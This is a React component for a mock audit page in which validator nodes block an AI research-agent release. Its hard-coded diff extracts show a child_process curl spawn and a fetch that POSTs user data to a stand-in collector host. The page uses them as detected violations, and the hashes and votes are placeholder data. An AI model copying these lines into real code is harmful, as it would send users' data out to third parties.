import React from 'react';
import { Link } from 'react-router-dom';
import { ShieldAlert, AlertTriangle, Lock, Terminal, CheckCircle2, ArrowRight, ArrowLeft, Copy, ExternalLink } from 'lucide-react';
import { CopyButton } from '../components/ui/CopyButton';

export const DecisionViolationPage: React.FC = () => {
  return (
    <div className="flex flex-col w-full pb-16">
      {/* Topmost Dossier Bar with Breadcrumb Metadata */}
      <section className="bg-brand-charcoal text-white px-4 lg:px-12 py-2.5 border-b-2 border-brand-charcoal flex flex-wrap items-center justify-between gap-3 text-xs font-mono">
        <div className="flex items-center gap-2 flex-wrap">
          <span className="bg-brand-orange text-white px-2 py-0.5 font-bold uppercase tracking-wider text-[11px] shadow-[2px_2px_0px_#000]">
            AUDIT DOSSIER #61997-VERDICT-03
          </span>
          <span className="text-stone-500">/</span>
          <Link to="/packages/atlas-research-agent" className="text-stone-300 font-bold hover:text-white">
            atlas-protocol / research-agent
          </Link>
          <span className="text-stone-500">::</span>
          <span className="text-brand-pastelYellow font-bold uppercase tracking-wider">
            RELEASE BLOCKED
          </span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-stone-400 flex items-center gap-1.5 text-[11px]">
            <Lock className="w-3.5 h-3.5 text-brand-orange" />
            CANONICAL STATE: <span className="text-white font-bold">FROZEN v1.4.2</span>
          </span>
          <span className="bg-stone-800 text-stone-300 px-2 py-0.5 border border-stone-700 text-[10px] uppercase font-bold tracking-widest hidden sm:inline">
            GENLAYER STUDIO NEXT
          </span>
        </div>
      </section>

      {/* 1. Verdict Hero Banner (Vibrant Orange Stepped Pattern) */}
      <section className="bg-brand-orange text-white border-b-2 border-brand-charcoal relative overflow-hidden p-6 lg:p-10 stepped-pattern">
        <div className="relative z-10 max-w-[1440px] mx-auto">
          <div className="flex flex-wrap items-center justify-between gap-4 pb-6 border-b border-brand-charcoal/30">
            <div className="flex items-center gap-2">
              <span className="w-5 h-5 bg-brand-charcoal text-brand-pastelYellow flex items-center justify-center font-mono font-bold text-xs border border-brand-charcoal shadow-[2px_2px_0px_#0B130E]">
                !
              </span>
              <span className="font-mono text-xs font-bold uppercase tracking-widest text-brand-pastelYellow">
                VERDICT CODE: 0x03 — CAPABILITY VIOLATION
              </span>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className="bg-brand-pastelYellow text-brand-charcoal border border-brand-charcoal px-2.5 py-1 text-[11px] font-mono font-black -rotate-1 shadow-[2px_2px_0px_#0B130E]">
                RUNTIME HARD REJECTION
              </span>
              <span className="bg-brand-charcoal text-white border border-brand-charcoal px-2.5 py-1 text-[11px] font-mono font-bold rotate-1 shadow-[2px_2px_0px_#0B130E]">
                CONSENSUS 5/5 NODES
              </span>
              <span className="bg-white text-brand-charcoal border border-brand-charcoal px-2.5 py-1 text-[11px] font-mono font-bold shadow-[2px_2px_0px_#0B130E]">
                IMMUTABLE RECEIPT
              </span>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-end pt-6">
            <div className="lg:col-span-8 space-y-3">
              <div className="inline-block bg-brand-charcoal text-brand-pastelYellow px-2 py-0.5 text-[10px] font-mono font-bold uppercase tracking-widest border border-brand-charcoal">
                Security Enclave Intercept
              </div>
              <h1 className="text-3xl sm:text-4xl lg:text-5xl font-black uppercase tracking-tight text-white leading-none font-sans">
                RELEASE BLOCKED:<br />
                <span className="text-brand-charcoal bg-brand-pastelYellow px-2 py-0.5 border border-brand-charcoal inline-block mt-1 shadow-[4px_4px_0px_#0B130E]">
                  UNDECLARED CAPABILITY
                </span> DETECTED.
              </h1>
              <p className="text-sm md:text-base text-white/90 max-w-2xl font-medium leading-relaxed pt-2 font-sans">
                Candidate <code className="font-mono font-bold text-brand-charcoal bg-brand-pastelYellow px-1.5 py-0.5 border border-brand-charcoal">v1.5.0</code> attempted to introduce shell process execution and connect to an unwhitelisted external domain. The candidate has been rejected by GenLayer validator consensus. The approved canonical release remains locked at <code className="font-mono font-bold text-white bg-brand-charcoal px-1.5 py-0.5 border border-brand-charcoal">v1.4.2</code>.
              </p>
            </div>

            <div className="lg:col-span-4 flex flex-col gap-3 font-mono">
              <div className="bg-brand-charcoal text-white p-5 border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E]">
                <div className="flex items-center justify-between pb-1">
                  <span className="text-[11px] uppercase tracking-wider text-stone-400 font-bold">Consensus Rejection</span>
                  <ShieldAlert className="w-5 h-5 text-brand-orange" />
                </div>
                <div className="text-4xl font-black tracking-tight text-brand-pastelYellow font-sans">100%</div>
                <div className="text-xs text-stone-400 mt-1">Unanimous 5 of 5 multi-validator vote</div>
              </div>
              <div className="bg-brand-forest text-brand-pastelYellow p-3 border-2 border-brand-charcoal flex items-center justify-between text-xs shadow-[2px_2px_0px_#0B130E]">
                <span className="font-bold tracking-wider uppercase text-white">Enclave Exec Time</span>
                <span className="font-bold">2.84s [SYNC]</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* 2. Release Identity Bar */}
      <section className="bg-brand-cream border-b-2 border-brand-charcoal px-4 lg:px-12 py-4">
        <div className="max-w-[1440px] mx-auto grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 items-center font-mono">
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Package Namespace</span>
            <div className="text-xs font-bold truncate text-brand-charcoal">atlas-protocol/research-agent</div>
          </div>
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Candidate Version</span>
            <span className="text-xs font-bold bg-red-600 text-white px-2 py-0.5 border border-brand-charcoal inline-block shadow-[2px_2px_0px_#0B130E]">
              v1.5.0
            </span>
          </div>
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Commit SHA</span>
            <div className="text-[11px] truncate bg-white border border-brand-charcoal px-2 py-1 font-semibold text-brand-charcoal shadow-[2px_2px_0px_#0B130E]">
              61997-402 (d9b2e...)
            </div>
          </div>
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Active Baseline</span>
            <span className="text-xs font-bold bg-brand-forest text-brand-pastelYellow px-2 py-0.5 border border-brand-charcoal inline-block shadow-[2px_2px_0px_#0B130E]">
              v1.4.2 [SECURE]
            </span>
          </div>
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Validator Run Time</span>
            <span className="text-xs font-bold text-brand-charcoal block">2.84s (Parallel)</span>
          </div>
          <div className="space-y-1">
            <span className="text-[10px] uppercase tracking-wider text-stone-600 block font-bold">Gas Incurred</span>
            <span className="text-xs font-bold text-brand-orange block">0.0014 test GEN</span>
          </div>
        </div>
      </section>

      {/* 3. Main Body Split */}
      <div className="max-w-[1440px] mx-auto px-4 lg:px-12 py-10 w-full grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* Left 7 cols: Detected Violations Dossier */}
        <div className="lg:col-span-7 flex flex-col gap-6">
          <div className="flex items-baseline justify-between border-b-2 border-brand-charcoal pb-3">
            <div>
              <span className="font-mono text-xs text-brand-orange uppercase tracking-widest font-bold">Consensus Evidence Ledger</span>
              <h2 className="text-2xl font-black uppercase text-brand-charcoal tracking-tight mt-0.5 font-sans">
                Detected Violations Dossier
              </h2>
            </div>
            <span className="bg-red-600 text-white text-xs font-mono font-bold px-3 py-1 border border-brand-charcoal shadow-[2px_2px_0px_#0B130E]">
              2 IRREVERSIBLE BREACHES
            </span>
          </div>

          {/* Violation 01: Shell Subprocess */}
          <article className="bg-white border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E] p-6 flex flex-col gap-4">
            <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-stone-200">
              <div className="flex items-center gap-2">
                <span className="bg-red-600 text-white font-mono text-[11px] px-2 py-0.5 font-bold uppercase border border-brand-charcoal">
                  CRITICAL
                </span>
                <span className="font-mono text-xs font-bold text-brand-charcoal">
                  VIOLATION 01 :: NEW_SHELL_EXECUTION
                </span>
              </div>
              <span className="font-mono text-[11px] text-stone-500 font-bold">SEVERITY INDEX: 9.8 / 10</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="bg-stone-50 border border-brand-charcoal p-3 space-y-1 shadow-[2px_2px_0px_#0B130E]">
                <div className="flex items-center gap-1.5 text-stone-700">
                  <Terminal className="w-3.5 h-3.5 text-brand-forest" />
                  <span className="font-mono text-[10px] uppercase font-bold text-stone-600">Frozen Charter Baseline Rule</span>
                </div>
                <p className="font-mono text-xs text-brand-charcoal font-bold">
                  Shell & Process Execution: <span className="text-red-600 font-black">STRICTLY PROHIBITED</span>
                </p>
                <p className="text-xs text-stone-600 leading-relaxed font-sans">
                  Charter hash: 0x98fa...148f specifies zero runtime process forks or terminal subshells.
                </p>
              </div>

              <div className="bg-brand-pastelYellow border border-brand-charcoal p-3 space-y-1 shadow-[2px_2px_0px_#0B130E]">
                <div className="flex items-center gap-1.5 text-stone-800">
                  <AlertTriangle className="w-3.5 h-3.5 text-brand-orange" />
                  <span className="font-mono text-[10px] uppercase font-bold text-brand-charcoal">Observed Candidate Diff</span>
                </div>
                <p className="font-mono text-xs text-brand-charcoal font-bold">src/runners/process_exec.ts:L42</p>
                <p className="text-xs text-stone-800 leading-relaxed font-sans">
                  Imports <code className="font-mono bg-white px-1 border border-brand-charcoal font-bold text-brand-orange">child_process</code> and initiates asynchronous sub-process.
                </p>
              </div>
            </div>

            <div className="bg-brand-forest text-stone-200 p-4 font-mono text-xs border border-brand-charcoal shadow-inner space-y-1 overflow-x-auto">
              <div className="text-stone-400 pb-2 border-b border-stone-800 flex items-center justify-between text-[11px]">
                <span className="text-brand-pastelYellow font-bold">DIFF EXTRACT: src/runners/process_exec.ts</span>
                <span className="text-brand-orange font-bold">+1 line added</span>
              </div>
              <pre className="font-mono leading-relaxed pt-2">
                <span className="text-stone-500">39  import &#123; AgentContext &#125; from '../types';</span>{'\n'}
                <span className="text-stone-500">40  import &#123; validateTaskParameters &#125; from './validator';</span>{'\n'}
                <span className="text-stone-500">41  </span>{'\n'}
                <span className="bg-brand-orange/30 text-white block px-2 py-1 font-bold border-l-2 border-brand-orange">
                  <span className="text-brand-pastelYellow mr-2 font-black">+</span>const proc = child_process.spawn('curl', [targetUrl]);
                </span>
                <span className="text-stone-500">43  return await pipeOutput(proc);</span>
              </pre>
            </div>

            <div className="bg-stone-100 border border-brand-charcoal p-3.5 flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-red-600 mt-0.5 shrink-0" />
              <div>
                <span className="font-mono text-[10px] uppercase font-bold text-stone-700 block">Impact Assessment</span>
                <p className="text-xs text-stone-700 leading-relaxed font-sans">
                  Introduces arbitrary execution primitives not permitted in the initial baseline. Bypasses sandboxed WASM memory boundaries, enabling unmonitored host execution pathways.
                </p>
              </div>
            </div>
          </article>

          {/* Violation 02: Network Egress */}
          <article className="bg-white border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E] p-6 flex flex-col gap-4">
            <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-stone-200">
              <div className="flex items-center gap-2">
                <span className="bg-brand-orange text-white font-mono text-[11px] px-2 py-0.5 font-bold uppercase border border-brand-charcoal">
                  HIGH
                </span>
                <span className="font-mono text-xs font-bold text-brand-charcoal">
                  VIOLATION 02 :: NEW_NETWORK_DOMAIN
                </span>
              </div>
              <span className="font-mono text-[11px] text-stone-500 font-bold">SEVERITY INDEX: 8.4 / 10</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="bg-stone-50 border border-brand-charcoal p-3 space-y-1 shadow-[2px_2px_0px_#0B130E]">
                <div className="flex items-center gap-1.5 text-stone-700">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />
                  <span className="font-mono text-[10px] uppercase font-bold text-stone-600">Permitted Egress Allowlist</span>
                </div>
                <ul className="text-xs font-mono text-stone-800 space-y-1 pt-1">
                  <li className="flex items-center gap-1.5 text-brand-forest font-bold">✓ api.anthropic.com</li>
                  <li className="flex items-center gap-1.5 text-brand-forest font-bold">✓ api.genlayer.io</li>
                  <li className="flex items-center gap-1.5 text-brand-forest font-bold">✓ arxiv.org</li>
                </ul>
              </div>

              <div className="bg-brand-pastelYellow border border-brand-charcoal p-3 space-y-1 shadow-[2px_2px_0px_#0B130E]">
                <div className="flex items-center gap-1.5 text-stone-800">
                  <AlertTriangle className="w-3.5 h-3.5 text-brand-orange" />
                  <span className="font-mono text-[10px] uppercase font-bold text-brand-charcoal">Undeclared Connection Attempt</span>
                </div>
                <p className="font-mono text-xs text-brand-charcoal font-bold truncate">src/network/client.ts:L88</p>
                <div className="bg-white border border-brand-charcoal p-1 font-mono text-brand-orange font-bold text-xs truncate">
                  https://telemetry-collect-xyz.net/metrics
                </div>
              </div>
            </div>

            <div className="bg-brand-forest text-stone-200 p-4 font-mono text-xs border border-brand-charcoal shadow-inner space-y-1 overflow-x-auto">
              <div className="text-stone-400 pb-2 border-b border-stone-800 flex items-center justify-between text-[11px]">
                <span className="text-brand-pastelYellow font-bold">DIFF EXTRACT: src/network/client.ts</span>
                <span className="text-brand-orange font-bold">+3 lines added</span>
              </div>
              <pre className="font-mono leading-relaxed pt-2">
                <span className="text-stone-500">86  async sendTelemetryPayload(data: Record&lt;string, any&gt;) &#123;</span>{'\n'}
                <span className="text-stone-500">87    const endpoint = getTelemetryHost();</span>{'\n'}
                <span className="bg-brand-orange/30 text-white block px-2 py-1 font-bold border-l-2 border-brand-orange">
                  <span className="text-brand-pastelYellow mr-2 font-black">+</span>  const telemetryHost = "https://telemetry-collect-xyz.net/metrics";
                </span>
                <span className="bg-brand-orange/30 text-white block px-2 py-1 font-bold border-l-2 border-brand-orange">
                  <span className="text-brand-pastelYellow mr-2 font-black">+</span>  await fetch(telemetryHost, &#123; method: "POST", body: JSON.stringify(data) &#125;);
                </span>
                <span className="text-stone-500">90  &#125;</span>
              </pre>
            </div>

            <div className="bg-stone-100 border border-brand-charcoal p-3.5 flex items-start gap-3">
              <ShieldAlert className="w-5 h-5 text-brand-orange mt-0.5 shrink-0" />
              <div>
                <span className="font-mono text-[10px] uppercase font-bold text-stone-700 block">Policy Ingress/Egress Violation</span>
                <p className="text-xs text-stone-700 leading-relaxed font-sans">
                  Agent attempts to transmit user context logs and dynamic runtime heuristics to an unregistered 3rd-party collector. This directly breaches Article IV (Data Exfiltration Prevention) of the immutable agent charter.
                </p>
              </div>
            </div>
          </article>
        </div>

        {/* Right 5 cols: Consensus Strip, Proof & Actions */}
        <div className="lg:col-span-5 flex flex-col gap-6">
          {/* Validator Consensus Strip */}
          <section className="bg-white border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E] p-6 space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-stone-200">
              <div>
                <span className="font-mono text-[10px] text-stone-500 uppercase tracking-wider block font-bold">
                  Intelligent Multi-Validator Engine
                </span>
                <h3 className="text-lg font-black uppercase text-brand-charcoal tracking-tight font-sans">
                  Validator Consensus Strip
                </h3>
              </div>
              <ShieldAlert className="w-6 h-6 text-brand-orange" />
            </div>
            <p className="text-xs text-stone-600 leading-relaxed font-sans">
              5 LLM-backed validator nodes independently evaluated candidate bytecode and AST representations against charter constraints. All 5 concurred on automatic termination.
            </p>

            <div className="space-y-2 font-mono">
              {[
                { name: 'Node 1', addr: '0x81a4..31f' },
                { name: 'Node 2', addr: '0x39fa..b72' },
                { name: 'Node 3', addr: '0xb441..e09' },
                { name: 'Node 4', addr: '0x99e8..81c' },
                { name: 'Node 5', addr: '0x12ce..9ff' },
              ].map((node, i) => (
                <div key={i} className="bg-stone-50 border border-brand-charcoal p-2.5 flex items-center justify-between hover:bg-stone-100 transition-colors">
                  <div className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 bg-red-600 border border-brand-charcoal"></span>
                    <span className="text-xs text-brand-charcoal font-bold">{node.name}</span>
                    <span className="text-[11px] text-stone-500 truncate max-w-[110px]">{node.addr}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-white bg-red-600 px-2 py-0.5 font-bold uppercase border border-brand-charcoal">
                      REJECT
                    </span>
                    <span className="text-xs text-stone-500 font-bold">100%</span>
                  </div>
                </div>
              ))}
            </div>

            <div className="bg-brand-charcoal text-white p-3 flex items-center justify-between text-xs font-mono border border-brand-charcoal">
              <span className="text-stone-400">CONSENSUS THRESHOLD: 3/5</span>
              <span className="font-bold text-brand-pastelYellow">OBSERVED: 5/5 REJECT</span>
            </div>
          </section>

          {/* Cryptographic Receipt */}
          <section className="bg-brand-forest text-white border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E] p-6 space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-stone-800">
              <div>
                <span className="font-mono text-[10px] text-brand-pastelYellow uppercase font-bold tracking-wider">
                  On-Chain State Proof
                </span>
                <h3 className="text-lg font-black uppercase text-white font-sans tracking-tight">
                  Cryptographic Receipt
                </h3>
              </div>
              <Terminal className="w-5 h-5 text-brand-pastelYellow" />
            </div>

            <div className="space-y-3 font-mono text-xs">
              <div className="bg-brand-charcoal p-3 border border-stone-800 space-y-1">
                <div className="flex items-center justify-between text-stone-400 text-[10px] uppercase font-bold">
                  <span>Intelligent Contract Tx Hash</span>
                  <span className="text-emerald-400 font-bold">CONFIRMED</span>
                </div>
                <div className="flex items-center justify-between gap-2 pt-1">
                  <span className="text-white text-xs truncate">0x78ab499120bc918412891c98492019488a19891c</span>
                  <CopyButton text="0x78ab499120bc918412891c98492019488a19891c" label="" />
                </div>
              </div>

              <div className="bg-brand-charcoal p-3 border border-stone-800 space-y-1">
                <div className="flex items-center justify-between text-stone-400 text-[10px] uppercase font-bold">
                  <span>Merkle Diff Root</span>
                  <span className="text-stone-500">KECCAK256</span>
                </div>
                <div className="text-white text-xs truncate pt-0.5">0xd84192ba87123aa9e18bca4872910cbe8822910</div>
              </div>

              <div className="bg-brand-charcoal p-3 border border-stone-800 space-y-1">
                <div className="flex items-center justify-between text-stone-400 text-[10px] uppercase font-bold">
                  <span>Charter Immutable Root</span>
                  <span className="text-brand-pastelYellow">FROZEN</span>
                </div>
                <div className="text-white text-xs truncate pt-0.5">0x11029ba87192bc9124a98e219ba48810c920119f</div>
              </div>
            </div>
          </section>

          {/* Action Resolution Buttons */}
          <section className="bg-white border-2 border-brand-charcoal shadow-[4px_4px_0px_#0B130E] p-6 space-y-3 font-mono text-xs">
            <span className="text-stone-600 uppercase tracking-wider block font-bold">
              Release Resolution Actions
            </span>

            <Link
              to="/packages/atlas-research-agent/releases/new/evidence"
              className="w-full bg-brand-orange hover:bg-brand-charcoal text-white font-bold p-3.5 flex items-center justify-between border-2 border-brand-charcoal shadow-[2px_2px_0px_#0B130E] uppercase transition-colors"
            >
              <span>Inspect Full Semantic Diff</span>
              <ArrowRight className="w-4 h-4" />
            </Link>

            <Link
              to="/register/identity"
              className="w-full bg-brand-forest hover:bg-brand-charcoal text-brand-pastelYellow font-bold p-3.5 flex items-center justify-between border-2 border-brand-charcoal shadow-[2px_2px_0px_#0B130E] uppercase transition-colors"
            >
              <span className="text-white">Submit Corrected Candidate (v1.5.1)</span>
              <ArrowRight className="w-4 h-4" />
            </Link>

            <Link
              to="/packages/atlas-research-agent"
              className="w-full bg-brand-cream hover:bg-stone-200 text-brand-charcoal font-bold p-3 flex items-center justify-between border border-brand-charcoal shadow-[2px_2px_0px_#0B130E] uppercase transition-colors"
            >
              <span>Return to Package Detail</span>
              <ArrowLeft className="w-4 h-4" />
            </Link>
          </section>
        </div>
      </div>
    </div>
  );
};
